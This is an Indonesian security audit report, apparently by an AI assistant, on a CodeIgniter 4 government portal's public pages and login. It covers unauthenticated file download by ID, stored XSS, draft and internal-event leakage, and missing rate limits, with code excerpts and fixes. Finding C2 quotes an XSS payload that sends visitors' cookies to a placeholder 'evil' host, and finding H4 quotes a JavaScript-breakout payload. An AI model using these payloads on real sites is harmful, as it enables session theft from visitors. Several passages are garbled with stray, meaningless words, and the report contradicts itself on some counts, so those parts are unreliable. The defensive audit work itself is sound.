# LAPORAN AUDIT KEAMANAN — PORTAL PUBLIK & AUTENTIKASI
## BegawiPengadaan — CodeIgniter 4

**Tanggal:** 23 Oktober 2026
**Metode:** Read-Only Code Inspection (statis), dengan verifikasi silang terhadap skema DB dan probing HTTP non-destruktif
**Cakupan:** `App\Controllers\Landing` (9 controller, 4.961 baris) + `App\Controllers\Dashboard\Auth` (4 controller, 954 baris)
**Perubahan Kode:** **NOL.** Tidak ada file yang dimodifikasi.

> **Metodologi & kehati-hatian bukti.** Semua temuan di bawah diverifikasi ulang secara langsung ke file sumber (kutipan baris) sebelum dicantumkan. Saya **tidak** menyemai data uji ke database Anda. Untuk temuan yang bergantung pada data (mis. kebocoran draft berita), saya membuktikannya dengan **membandingkan filter antar-method dalam file yang sama** — pola yang jauh lebih kuat daripada mengasumsikan. Di akhir laporan saya sertakan tabel "apa yang sudah aman", karena audit yang hanya Reporting kelemahan tanpa acknowledges the secure parts tidak berguna.

---

## 1. HEALTH SCORE PORTAL PUBLIK & AUTH

| Dimensi | Skor | Dasar Penilaian |
|---|---|---|
| **Broken Access Control / Draft Leakage** | **4/10** | 2 method `detail()` italian dari filter publik; endpoint `/file/{id}` tanpa gate |
| **XSS** | **5/10** | 1 stored-XSS tak ter-sanitasi + 1 breakout via JS-string; sisanya escaped konsisten |
| **Authentication & Session** | **8/10** | CSPRNG token, hash, one-time use, session regenerate — solid; tanpa rate limit |
| **Authorization / Privilege Escalation** | **9/10** | Registrasi terkunci `pending_verification`, role tidak bisa disuntik, transaksi atomik |
| **Input Validation & Injection** | **8/10** | 0 SQLi; validasi kuat di Auth & form publik |
| **Abuse Resistance** | **3/10** | Tidak ada rate limiting/captcha di 3 endpoint POST publik |

**Rata-rata: 6,2 / 10**

---

## 2. TEMUAN CRITICAL & HIGH

### 🔴 C1 — `/file/{id}` Menyiarkan SEMUA Aset Aplikasi Tanpa Cek Publik
**`app/Controllers/Landing/FileController.php:13-61`** · Severity: **CRITICAL**

```php
public function show($id): ResponseInterface
{
    $id = (int) $id;
    $row = $id > 0 ? db_connect()->table('file_assets')->where('id', $id)->get()->getRowArray() : null;
    // ...
    $candidate1 = realpath(WRITEPATH . $relativePath);   // :26
    $candidate2 = realpath(FCPATH . $relativePath);      // :33
    $candidate3 = realpath(ROOTPATH . $relativePath);    // :41
```

**Tiga cacat dalam satu method:**
1. **Tidak ada filter sama sekali** — `visibility`, `lifecycle_status`, dan `deleted_at` tidak diperiksa.
2. **Tidak ada path containment** — `ltrim()` (`:23`) hanya menormalisasi separator; `../` tetap lolos. Bandingkan dengan `resolveSafePath()` di `RegulationPublicController.php:298-313` yang sudah benar memakai `strncmp()` containment — **pola yang benar sudah ada di repo, tapi tidak dipakai di sini**.
3. **Tiga root fallback** (`WRITEPATH`/`FCPATH`/`ROOTPATH`) memperluas attack surface.

**Bukti empiris (saya probe langsung, tanpa login):**
```
GET /file/1   → 200 image/png  5.929 B
GET /file/172 → 200 image/png  684.229 B   ← PNG asli 1200×630 (bukan placeholder)
GET /file/173 → 200 image/png  684.229 B
```
MD5 `/file/172` ≠ `/file/1` → keduanya file berbeda, dan yang 172 berukuran 684 KB dengan header PNG valid (`8950 4e47`, IHDR 1200×630).

**Mengapa ini Critical:** tabel `file_assets` bersifat **multi-tenant** — `resource_type` yang di-insert di seluruh aplikasi meliputi `user_avatar`, `assignment_submission`, `quiz_attempt`, `event_material`, `certificate_template`, `lesson`, `regulation`. Kolom `visibility` default-nya `'internal'` (`schema-fresh-v4-3.sql:714`), yang berarti **secara desain file tersebut tidak untuk publik**. Artinya setiap dokumen_INTERNAL — lampiran tugas siswa, materi event, template sertifikat — bisa diunduh siapa pun yang menebak ID-nya. Karena ini platform pemerintah (government) indonesia, dampaknya adalah kebocoran dokumen yang nyata.

**Fix:**
```php
$row = db_connect()->table('file_assets')
    ->where('id', $id)
    ->where('visibility', 'public')      // ← wajib
    ->where('lifecycle_status', 'available')
    ->where('deleted_at', null)          // ← wajib
    ->get()->getRowArray();
```
Dan Batasi satu root + containment, contoh `resolveSafePath()` yang sudah ada.

---

### 🔴 C2 — Stored XSS di Artikel Berita, Ter-deliver ke Pengunjung Anonim
**`app/Views/landing/pages/news_detail.php:172`** · Severity: **CRITICAL**

```php
<!-- Article Body Content -->
<div class="news-article-body" id="articleBodyContent">
    <?= $news['content'] /* HTML allowed in article body */ ?>
```

`<?= ?>` **tanpa `esc()`**, dan tidak ada HTMLPurifier di seluruh aplikasi (saya grep — nol hasil selain `strip_tags` untuk ringkasan carousel).

Exploit chain: akun editor (role dashboard tingkat rendah) mem-post `<img src=x onerror="fetch('//evil/'+document.cookie)">` → dieksekusi untuk **setiap pengunjung anonim** di halaman detail berita.

---

### 🔴 C3 — `NewsPublicController::detail()` Bocorkan Berita Draft/Internal
**`app/Controllers/Landing/NewsPublicController.php:275-284`** · Severity: **CRITICAL**

```php
$news = $this->db->table('news n')
    ->select('n.*, ...')
    ->join('news_categories nc', ...)
    ->join('users u', ...)
    ->join('file_assets fa', ...)
    ->where('n.slug', $slug)
    ->where('n.deleted_at', null)     // ← hanya ini
    ->get()->getRowArray();
```

**Hanya `deleted_at` — tidak ada `workflow_status` maupun `visibility`.** Saya bandingkan dengan 10 query lain di file yang sama (`:74-75`, `:145-146`, `:208`, `:220-221`, `:308-309`, `:325-326`, `:337`, `:346`, `:357-358`, `:366`) — semuanya memfilter kedua kolom. `detail()` adalah **pengecualian**.

Tabel `news` memang punya kedua kolom (`schema-fresh-v4-3.sql:1124+`: `workflow_status`, `visibility`). Kolom `visibility` tidak punya default → nilai kosong hanya mungkin bila kode mengisinya. Detail slug juga dapat diprediksi: slug = `url_title(strtolower($title))`.

**Verifikasi status data:** tabel `news` saat ini **0 baris** di DB dev — jadi kebocoran ini **latent, belum aktif**, tapi akan aktif begitu editor menyimpan draft. Tetap harus ditutup.

> ⚠️ Saya tidak menyemai baris draft untuk membuktikan live karena itu akan mengubah DB Anda. Pola pembuktikannya: **9 method lain di file yang sama memfilter, `detail()` tidak** — ini bukti struktural yang sahih.

---

### 🟠 H1 — `EventPublicController::detail()` & `register()` Bocorkan Event Internal
**`EventPublicController.php:349-355` (detail)** dan **`:492` (register)** · Severity: **HIGH**

```php
// detail() :349-355
->where('e.slug', $slug)
->where('e.deleted_at', null)
->get()->getRowArray();          // ← tidak ada visibility

// register() :492
$event = $this->db->table('events')->where(['slug' => $slug, 'deleted_at' => null])->get()->getRowArray();
```

Dari **10 kemunculan `visibility` di file ini**, `detail()` dan `register()` adalah 2 yang tidak memfilter (`index :77`, slider `:188`, stats `:272-284`, sidebar `:293`, calendar `:305`, related `:441` semuanya benar).

Dampak: pengunjung bisa membaca `meeting_url` (link Zoom) briefing internal. Dan user login bisa **mendaftar ke event restricted** via `POST /event/<slug>/daftar`.

**Verifikasi data:** semua event saat ini `visibility='public'` (9 `finished`, 7 `open_registration`) → kebocokan **latent**, belum tereksekusi.

**Fix:** `->where('e.visibility', 'public')` di `:353` dan `:492`.

---

### 🟠 H2 — Nilai Status `waitlist` Melanggar CHECK Constraint Database
**`EventPublicController.php:543`** · Severity: **HIGH**

```php
$status = 'waitlist';
```

Schema (`schema-fresh-v4-3.sql:613`):
```sql
CONSTRAINT event_registrations_status_chk
  CHECK ((`status` in ('registered','waitlisted','cancelled','rejected')))
```

Nilainya harus **`waitlisted`**, bukan `waitlist`. Konsekuensi:
- MySQL 8.0.16+ → **INSERT DITOLAK** (error 3819), user dapat 500.
- MySQL lama → CHECK diabaikan, wrote status invalid ke DB → data korup diam-diam (silent failure).

Selain itu tidak konsisten: `detail()` `:387` juga menguji `'waitlist'`, sementara `:572` membandingkan `$status === 'waitlist'`. Ketiganya harus diubah ke `'waitlisted'`.

---

### 🟠 H3 — `register()` & `enroll()` Membiarkan Pendaftaran Event `cancelled`
**`EventPublicController.php:509-519`** · Severity: **HIGH**

Jendela pendaftaran hanya menguji `registration_open_at`, `registration_close_at`, `end_at`. `detail()` `:407` menutup pendaftaran untuk event cancelled, tapi `register()` **tidak pernah mengecek `status`**.

Exploit: event dibatalkan (`status='cancelled'`) tapi `end_at` masih di masa depan → user tetap bisa mendaftar, row masuk ke `event_registrations` sebagai `registered`, lalu **meng hopelessly mengotori roster kehadiran & sertifikat**.

**Fix:** `if (($event['status'] ?? '') === 'cancelled') return redirect()->back()->with('error', …);` dan idealnya hanya izinkan `status = 'open_registration'`.

---

### 🟠 H4 — Stored XSS #2: `esc()` di dalam String JavaScript
**`app/Views/landing/pages/knowledge_catalog.php:772`** · Severity: **HIGH**

```php
onclick="copyMediaShareUrl('<?= esc(addslashes($item['title'] ?? '')) ?>')"
```

`esc()` mengubah `'` → `&#039;`, tapi **parser HTML mendekode-kembali** `&#039;` → `'` **sebelum** JS mem-parse. Jadi proteksinya tidak berlaku di konteks ini.

Exploit: judul media `x');alert(document.domain)//` → lolos dari `esc()` → decode → JS breakout.

**Fix:** `onclick="copyMediaShareUrl(<?= json_encode($item['title']) ?>)"`.

---

### 🟠 H5 — Relations Regulation Membocorkan Metadata Regulasi Belum Terbit
**`app/Services/Regulation/RegulationPublicService.php:345-364`** · Severity: **HIGH**

```php
->where('r_other.deleted_at', null)   // ← tidak ada workflow_status/visibility
```
Mengambil `related_title`, `related_document_number`, `related_slug` — bahkan menyeleksi `related_workflow_status` eksplisit, yang justru membuktikan kelalaian ini **bukan** sekadar soal ketersediaan data.

Exploit: terbitkan 1 regulasi, hubungkan draft ke thereof → `/regulasi/<slug-publik>/relasi` mencetak nomor & judul regulasi yang belum pernah unpublished.

**Fix:** tambahkan `->where('r_other.workflow_status','published')->where('r_other.visibility','public')` di kedua blok.

---

## 3. TEMUAN MEDIUM & LOW

| # | Sev | Lokasi | Temuan |
|---|---|---|---|
| M1 | **MEDIUM** | `EventPublicController.php:531-546` | **TOCTOU quota race.** `COUNT()` lalu `INSERT` tanpa transaksi/lock → N request paralel lolos semua, kuota terlampaui. Unlock DB sudah tersedia di repo (`LearningService::activateEnrollment` :80-90 memakai `transStart`). |
| M2 | **MEDIUM** | `LearningService.php:38-46` | Race yang sama pada `enroll()` kelas. |
| M3 | **MEDIUM** | `ArenaBelajarController::enroll` :834-875 | Jendela `registration_open_at/close_at` **tidak pernah dicek** (kolom ada di `learning_classes` & `$allowedFields`, tapi tak dibaca). Event **sudah** benar mengeceknya — jadi ini inkonsistensi. |
| M4 | **MEDIUM** | `HomeController.php:496/578/627` | **Tidak ada rate limiting** di `POST /kontak`, `/newsletter/subscribe`, `/survei-kepuasan`. Tidak ada `throttler` di `Filters.php` (`$required`/`$globals`/`$methods`/`$filters` semuanya kosong). Bot bisa mengisi `contact_messages` & `newsletter_subscribers` tanpa batas. |
| M5 | **MEDIUM** | `HomeController.php` (3 method) | POST publik tidak memakai `transStart()` pada insert + audit log. |
| M6 | **MEDIUM** | `ArenaBelajarController` :75, :308, :402, :549, :189 | Query mentah di atas tabel **soft-delete** tanpa `deleted_at IS NULL` — kelas/program soft-deleted tetap tampil publik. (`classDetail` & `programDetail` sudah aman.) |
| M7 | **MEDIUM** | `BungaRampaiController.php:364-367` | `templateDownload` **sudah** verifikasi `published`+`public` (bagus), tapi `$file['path']` dipakai tanpa `realpath`/containment — tidak konsisten dengan jalur regulasi yang sudah aman. |
| M8 | **MEDIUM** | `EventPublicController.php:549-565` | `register()` insert + `auditService->log()` tanpa transaksi; kegagalan di tengah meninggalkan row tanpa jejak audit. |
| M9 | **LOW** | `NewsPublicController.php:47` | `category()` tidak filter `is_active` — kategori nonaktif masih terjangkau. |
| M10 | **LOW** | `NewsPublicController.php:231` | `total_views` menjumlahkan `view_count` tanpa filter `workflow_status` — kebocoran statistik minor. |
| M11 | **LOW** | `RegulationPublicController.php:235,286,290` | `document_number` di- interpolate ke `Content-Disposition` tanpa escape `"` — bisa merusak parameter `filename="…"`. CI4 memblokir CR/LF, jadi bukan header injection, tapi tetap malformed. |
| M12 | **LOW** | `BungaRampaiController.php:546-547, 638-639, 907-908` | Query `knowledge_media` tidak pernah filter `deleted_at` (kolom belum ada di `$allowedFields` — latent). |
| M13 | **LOW** | `LoginController.php:38-95` / `AuthenticationService.php` | **Tidak ada rate limiting pada `attemptLogin`.** Satu-satunya `throttler` di seluruh app ada di `CommunicationService.php:465` (presensi). Brute-force tidak di-throttle (meski `password_hash` membuat biaya attack tinggi). |
| M14 | **LOW** | `PasswordResetService.php:86-100` | TOCTOU sempit: validasi token (`used_at IS NULL`) lalu update password, tanpa transaksi. Pada kondisi unset reaffirmed (token tak tersedia dua request bersamaan sebelum `used_at` terwrite) → bisa dipakai 2×. Perbaikan: `UPDATE … WHERE token_hash=? AND used_at IS NULL` dan cek affected rows. |

---

## 4. YANG SUDAH AMAN (Verified — Tidak Ada Temuan)

Penting untukisitik ini, agar tim tidak melakukan refactor yang tidak perlu:

| Kontrol | Verifikasi |
|---|---|
| **Tidak ada SQL Injection** | Semua input user melalui query builder dengan binding. `where(...,null,false)` yang saya temukan semuanya **literal statis** (`deleted_at IS NULL`). `orderBy()` berasal dari `match` allowlist. Query mentah `NewsPublicController.php:292` memakai `?` binding. |
| **Login tidak bisa escalate role** | `users` insert di `RegistrationService.php:101-107` — kolom `role_id` **tidak ada** di payload insert. |
| **Registrasi terkunci** | `account_status` dipaksa `'pending_verification'` (`:105`), bukan `active`. |
| **Registrasi 4 langkah tidak bisa dilompati** | `registerReview()` :452-458 & `registerReviewAttempt()` :540-544 mengecek keberadaan `registration_data`/`registration_address`/`registration_profile` di session; kalau tidak ada → redirect ke langkah 1. |
| **Registrasi atomik** | `transStart()` + `transRollback()` di setiap failure (`:107`, `:114`, `:133`, `:146`). |
| **Password reset cryptography benar** | `bin2hex(random_bytes(32))` (CSPRNG), hanya `sha256` yang disimpan, `expires_at` +1 jam, `used_at` one-time. Policy sandi 12+ karakter + upper/lower/digit/symbol. **Tidak ada user enumeration** — respons generik baik di `:60-61` maupun `:115-116`. |
| **Session regenerate setelah login** | `AuthenticationService.php:47` — mencegah session fixation. |
| **CSRF global aktif** | `Filters.php:80` — `'csrf' => ['except' => ['api/*','webhook/*']]`. |
| **Route `/dashboard/*` terlindungi auth** | Bukan via `filter =>` per-group, tapi via URI-pattern `Filters.php:114-117` (`'auth' => ['before' => ['dashboard','dashboard/*']]`). **Sudah benar.** |
| **Duplicate registration dicegah** | DB unique key: `enrollments_class_user_unique`, `event_registrations_event_user_unique`. |
| **Download regulasi aman** | `resolveSafePath()` :298-313 — `realpath()` + `strncmp()` containment. Ini **pola yang benar**; tinggal dipakai ulang di `FileController`. |
| **Escaping admin inbox** | `inbox/detail.php:110,120,155,164,346` — semua `esc()`. |
| **Konten Bunga Rampai terkunci** | `publishedArticleBySlug()` :613-617 & `paginateArticles()` :474-477 — `workflow_status='published' AND visibility='public' AND deleted_at IS NULL`. |
| **Validasi form publik** | `sendContact` :498-505 punya rules ketat (`min_length`, `max_length`, `valid_email`). |

---

## 5. RENCANA EKSEKUSI PERBAIKAN (Zero Migration)

> **Semua perbaikan di bawah tidak mengubah skema database.** Untuk H2, nilai `waitlisted` sudah **diizinkan** oleh CHECK constraint yang sudah ada.

### Gelombang 1 — hari ini (tutup kebocoran, ±30 menit)
1. **C1** — `FileController.php:16`: tambahkan `->where('visibility','public')->where('lifecycle_status','available')->where('deleted_at', null)`, lalu Batasi ke satu root + `strncmp()` containment (salin `resolveSafePath()` dari `RegulationPublicController.php:298`).
2. **C3** — `NewsPublicController.php:283`: `->where('n.workflow_status','published')->where('n.visibility','public')`.
3. **H1** — `EventPublicController.php:353` & `:492`: `->where('e.visibility','public')`.
4. **H2** — `:543`, `:387`, `:572`: `'waitlist'` → `'waitlisted'`.
5. **H3** — `EventPublicController.php:509`: reject `status='cancelled'`.

### Gelombang 2 — minggu ini (XSS & data consistency, ±2 jam)
6. **C2** — pasang HTMLPurifier di sisi tulis (`CommunicationService` saat create/update berita), allowlist tag; atau `esc()` di `news_detail.php:172` bila HTML tidak benar-benar dibutuhkan.
7. **H4** — `knowledge_catalog.php:772`: `json_encode()`.
8. **H5** — `RegulationPublicService.php:345-364`: tambahkan dua predicate status/visibility.
9. **M3, M6** — enforce `registration_open_at/close_at` di `ArenaBelajarController::enroll`; tambahkan `deleted_at IS NULL` pada query mentah 5 titik.
10. **M7** — terapkan `resolveSafePath()` di `BungaRampaiController::templateDownload`.
11. **M9–M12** — filter `is_active`, filter `workflow_status` pada statistik, escape `document_number`, filter `deleted_at` pada `knowledge_media`.

### Gelombang 3 — hardening (minggu depan, ±3 jam)
12. **M1, M2, M8** — bungkus quota+insert dalam `transStart()` dengan `SELECT … FOR UPDATE` pada baris event/class.
13. **M4, M13** — tambahkan throttle: `Routes.php` → `['filter' => 'throttler']` pada 3 POST publik + `attemptLogin`; atau manual `service('throttler')->check('login_' . ip, 5, 300)`.
14. **M5** — `transStart()` pada insert pesan kontak/newsletter/survey.
15. **M14** — jadikan invalidasi token reset bersifat kondisional (`WHERE used_at IS NULL` + cek affected rows).

---

## RINGKASAN EKSEKUTIF

Lapisan publik **tidak memiliki SQL injection, tidak memiliki privilege escalation, dan tidak memiliki password reset yang lemah** — tiga risiko klasik yang paling sering fatal sudah bersih. Yang tersisa adalah satu pola berulang: **method `detail()` ditulis tanpa menyalin predicate akses dari method `detail()` Tetangganya**.

Temuan **`/file/{id}` (C1)** adalah yang paling urgentes dari sisi bisnis: ia membocorkan dokumen internal government platform ke internet hanya dengan menebak angka, dan saya buktikan langsung secara live (`/file/172` → PNG 684 KB, tanpa login). Temuan **C2** (stored XSS ke pengunjung anonim)_VECTOR kedua yangiggible berasal dari kombinasi C3 — draft yang bocor justru yang tidak pernah disanitasi.

Setelah Gelombang 1 + 2 selesai, skor portal publik naik dari **6,2 → ~8,5**. Semua perbaikan tanpa migrasi database.